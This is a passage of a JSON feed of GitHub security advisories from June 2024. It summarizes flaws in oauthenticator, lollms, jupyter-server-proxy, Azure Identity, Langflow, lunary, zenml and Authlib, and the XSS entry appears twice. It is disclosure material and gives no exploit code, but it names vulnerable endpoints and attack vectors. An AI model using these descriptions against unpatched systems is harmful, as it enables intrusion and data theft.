href=\"https://jupyterhub.readthedocs.io/en/stable/howto/upgrading-v5.html#authenticator-allow-all-and-allow-existing-users\">https://jupyterhub.readthedocs.io/en/stable/howto/upgrading-v5.html#authenticator-allow-all-and-allow-existing-users</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gprj-3p75-f996\">https://github.com/advisories/GHSA-gprj-3p75-f996</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gprj-3p75-f996",
            "title": "[oauthenticator] Globus `identity_provider` restriction ignored when used with `allow_all` in JupyterHub 5.0",
            "date_modified": "2024-06-12T19:24:06.000Z",
            "date_published": "2024-06-12T17:13:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gprj-3p75-f996"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>parisneo/lollms version 9.5 is vulnerable to Local File Inclusion (LFI) attacks due to insufficient path sanitization. The <code>sanitize_path_from_endpoint</code> function fails to properly sanitize Windows-style paths (backward slash <code>\\</code>), allowing attackers to perform directory traversal attacks on Windows systems. This vulnerability can be exploited through various routes, including <code>personalities</code> and <code>/del_preset</code>, to read or delete any file on the Windows filesystem, compromising the system's availability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4315\">https://nvd.nist.gov/vuln/detail/CVE-2024-4315</a></li>\n<li><a href=\"https://github.com/parisneo/lollms/commit/95ad36eeffc6a6be3e3f35ed35a384d768f0ecf6\">https://github.com/parisneo/lollms/commit/95ad36eeffc6a6be3e3f35ed35a384d768f0ecf6</a></li>\n<li><a href=\"https://huntr.com/bounties/8a1b0197-2c36-4276-b92b-630a2a9bb09c\">https://huntr.com/bounties/8a1b0197-2c36-4276-b92b-630a2a9bb09c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vqwr-q6cc-c242\">https://github.com/advisories/GHSA-vqwr-q6cc-c242</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vqwr-q6cc-c242",
            "title": "[lollms] parisneo/lollms Local File Inclusion (LFI) attack",
            "date_modified": "2024-06-12T17:12:46.000Z",
            "date_published": "2024-06-12T03:31:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vqwr-q6cc-c242"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There is a reflected cross-site scripting (XSS) issue in <code>jupyter-server-proxy</code>[1]. The <code>/proxy</code> endpoint accepts a <code>host</code> path segment in the format <code>/proxy/&lt;host&gt;</code>. When this endpoint is called with an invalid <code>host</code> value, <code>jupyter-server-proxy</code> replies with a response that includes the value of <code>host</code>, without sanitization [2]. A third-party actor can leverage this by sending a phishing link with an invalid <code>host</code> value containing custom JavaScript to a user. When the user clicks this phishing link, the browser renders the response of <code>GET /proxy/&lt;host&gt;</code>, which runs the custom JavaScript contained in <code>host</code> set by the actor.\nAs any arbitrary JavaScript can be run after the user clicks on a phishing link, this issue permits extensive access to the user's JupyterLab instance for an actor. This issue exists in the latest release of <code>jupyter-server-proxy</code>, currently <code>v4.1.2</code>.\n<strong>Impacted versions:</strong> <code>&gt;=3.0.0,&lt;=4.1.2</code></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patches are included in <code>==4.2.0</code> and <code>==3.2.4</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Server operators who are unable to upgrade can disable the <code>jupyter-server-proxy</code> extension with:</p>\n<pre><code>jupyter server extension disable jupyter-server-proxy\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>[1] : <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/\">https://github.com/jupyterhub/jupyter-server-proxy/</a>\n[2] : <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328\">https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr\">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22\">https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878\">https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328\">https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35225\">https://nvd.nist.gov/vuln/detail/CVE-2024-35225</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fvcq-4x64-hqxr\">https://github.com/advisories/GHSA-fvcq-4x64-hqxr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fvcq-4x64-hqxr",
            "title": "[jupyter-server-proxy] Jupyter Server Proxy has a reflected XSS issue in host parameter",
            "date_modified": "2024-06-12T19:18:37.000Z",
            "date_published": "2024-06-11T21:12:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fvcq-4x64-hqxr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There is a reflected cross-site scripting (XSS) issue in <code>jupyter-server-proxy</code>[1]. The <code>/proxy</code> endpoint accepts a <code>host</code> path segment in the format <code>/proxy/&lt;host&gt;</code>. When this endpoint is called with an invalid <code>host</code> value, <code>jupyter-server-proxy</code> replies with a response that includes the value of <code>host</code>, without sanitization [2]. A third-party actor can leverage this by sending a phishing link with an invalid <code>host</code> value containing custom JavaScript to a user. When the user clicks this phishing link, the browser renders the response of <code>GET /proxy/&lt;host&gt;</code>, which runs the custom JavaScript contained in <code>host</code> set by the actor.\nAs any arbitrary JavaScript can be run after the user clicks on a phishing link, this issue permits extensive access to the user's JupyterLab instance for an actor. This issue exists in the latest release of <code>jupyter-server-proxy</code>, currently <code>v4.1.2</code>.\n<strong>Impacted versions:</strong> <code>&gt;=3.0.0,&lt;=4.1.2</code></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patches are included in <code>==4.2.0</code> and <code>==3.2.4</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Server operators who are unable to upgrade can disable the <code>jupyter-server-proxy</code> extension with:</p>\n<pre><code>jupyter server extension disable jupyter-server-proxy\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>[1] : <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/\">https://github.com/jupyterhub/jupyter-server-proxy/</a>\n[2] : <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328\">https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr\">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22\">https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878\">https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328\">https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35225\">https://nvd.nist.gov/vuln/detail/CVE-2024-35225</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fvcq-4x64-hqxr\">https://github.com/advisories/GHSA-fvcq-4x64-hqxr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fvcq-4x64-hqxr",
            "title": "[jupyter-server-proxy] Jupyter Server Proxy has a reflected XSS issue in host parameter",
            "date_modified": "2024-06-12T19:18:37.000Z",
            "date_published": "2024-06-11T21:12:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fvcq-4x64-hqxr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35255\">https://nvd.nist.gov/vuln/detail/CVE-2024-35255</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499\">https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492\">https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178\">https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d\">https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53\">https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5vv-6r4h-3vj9\">https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5vv-6r4h-3vj9",
            "title": "[azure-identity] Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability",
            "date_modified": "2024-06-13T18:44:18.000Z",
            "date_published": "2024-06-11T18:30:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5vv-6r4h-3vj9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Langflow through 0.6.19 allows remote code execution if untrusted users are able to reach the \"POST /api/v1/custom_component\" endpoint and provide a Python script.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37014\">https://nvd.nist.gov/vuln/detail/CVE-2024-37014</a></li>\n<li><a href=\"https://github.com/langflow-ai/langflow/issues/1973\">https://github.com/langflow-ai/langflow/issues/1973</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qg33-x2c5-6p44\">https://github.com/advisories/GHSA-qg33-x2c5-6p44</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qg33-x2c5-6p44",
            "title": "[langflow] Langflow remote code execution vulnerability",
            "date_modified": "2024-06-11T19:29:17.000Z",
            "date_published": "2024-06-10T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qg33-x2c5-6p44"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In lunary-ai/lunary version 1.2.13, an insufficient granularity of access control vulnerability allows users to create, update, get, and delete prompt variations for datasets not owned by their organization. This issue arises due to the application not properly validating the ownership of dataset prompts and their variations against the organization or project of the requesting user. As a result, unauthorized modifications to dataset prompts can occur, leading to altered or removed dataset prompts without proper authorization. This vulnerability impacts the integrity and consistency of dataset information, potentially affecting the results of experiments.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5389\">https://nvd.nist.gov/vuln/detail/CVE-2024-5389</a></li>\n<li><a href=\"https://huntr.com/bounties/3ca5309f-5615-4d5b-8043-968af220d7a2\">https://huntr.com/bounties/3ca5309f-5615-4d5b-8043-968af220d7a2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3mwc-2cj7-gx8c\">https://github.com/advisories/GHSA-3mwc-2cj7-gx8c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3mwc-2cj7-gx8c",
            "title": "[lunary] lunary-ai/lunary Access Control Vulnerability in Prompt Variation Management",
            "date_modified": "2024-06-12T19:23:28.000Z",
            "date_published": "2024-06-10T00:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3mwc-2cj7-gx8c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in zenml-io/zenml version 0.56.3 allows attackers to reuse old session credentials or session IDs due to insufficient session expiration. Specifically, the session does not expire after a password change, enabling an attacker to maintain access to a compromised account without the victim's ability to revoke this access. This issue was observed in a self-hosted ZenML deployment via Docker, where after changing the password from one browser, the session remained active and usable in another browser without requiring re-authentication.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4680\">https://nvd.nist.gov/vuln/detail/CVE-2024-4680</a></li>\n<li><a href=\"https://huntr.com/bounties/c88f6bd2-490d-4930-98dd-03651b20230a\">https://huntr.com/bounties/c88f6bd2-490d-4930-98dd-03651b20230a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99hm-86h7-gr3g\">https://github.com/advisories/GHSA-99hm-86h7-gr3g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99hm-86h7-gr3g",
            "title": "[zenml] zenml-io/zenml does not expire the session after password reset",
            "date_modified": "2024-06-10T18:36:32.000Z",
            "date_published": "2024-06-08T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99hm-86h7-gr3g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>lepture Authlib before 1.3.1 has algorithm confusion with asymmetric public keys. Unless an algorithm is specified in a jwt.decode call, HMAC verification is allowed with any asymmetric public key. (This is similar to CVE-2022-29217 and CVE-2024-33663.)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37568\">https://nvd.nist.gov/vuln/detail/CVE-2024-37568</a></li>\n<li><a href=\"https://github.com/lepture/authlib/issues/654\">https://github.com/lepture/authlib/issues/654</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/authlib/PYSEC-2024-52.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/authlib/PYSEC-2024-52.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5357-c2jx-v7qh\">https://github.com/advisories/GHSA-5357-c2jx-v7qh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5357-c2jx-v7qh",
            "title": "[authlib] Authlib has algorithm confusion with asymmetric public keys",
            "date_modified": "2024-06-12T18:30:26.000Z",
            "date_published": "2024-06-09T21:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5357-c2jx-v7qh"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}